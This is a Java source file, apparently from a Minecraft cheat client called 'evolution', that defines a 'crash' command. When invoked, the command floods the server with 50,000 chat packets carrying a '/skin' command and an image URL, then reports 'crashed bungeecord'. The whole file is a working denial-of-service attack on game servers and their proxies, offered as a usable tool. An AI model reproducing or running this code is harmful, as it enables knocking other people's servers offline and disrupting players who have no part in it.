package wtf.evolution.command.impl;

import com.mojang.realmsclient.gui.ChatFormatting;
import net.minecraft.network.play.client.CPacketChatMessage;
import wtf.evolution.command.Command;
import wtf.evolution.command.CommandInfo;
import wtf.evolution.helpers.ChatUtil;

@CommandInfo(name = "crash")
public class CrashCommand extends Command {

    public static boolean hide = false;

    @Override
    public void execute(String[] args) {
        super.execute(args);
        hide = true;
        (new Thread(() -> {
            for (int f = 0; f < 50000; f++) {
                mc.player.connection.sendPacket(new CPacketChatMessage("/skin https://i.imgur.com/prP5baL.png"));
            }
            hide = false;
            ChatUtil.print("crashed bungeecord");
        })).start();

    }

    @Override
    public void onError() {
        super.onError();

    }
}
